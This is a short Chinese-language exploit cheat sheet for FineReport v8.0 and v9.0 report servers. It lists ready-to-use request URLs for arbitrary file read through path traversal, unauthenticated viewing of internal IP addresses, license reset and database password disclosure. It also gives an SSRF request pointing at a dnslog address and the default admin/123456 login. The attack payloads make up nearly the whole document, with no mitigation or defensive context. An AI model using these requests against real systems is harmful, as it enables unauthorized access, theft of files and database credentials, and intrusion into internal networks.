# 任意文件读取漏洞
```
影响
FineReport v8.0
FineReport v9.0

接口
/WebReport/ReportServer

POC
http://www.0-sec.org:8080/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true

参考链接
https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/FineReport/FineReport%20任意文件读取漏洞/
```
# 未授权查看访问内网ip
```
POC
/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false
```
# 未授权重置授权
```
/ReportServer?op=fr_server&cmd=sc_version_info&showtoolbar=false
```
# 查看数据库密码
```
/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
```
# SSRF
```
/ReportServer?op=resource&resource=dnslog地址
```
# 默认弱口令
```
/ReportServer?op=fr_auth&cmd=ah_loginui&_=1619795319853

admin / 123456
```

# 参考链接
http://www.hackdig.com/05/hack-341466.htm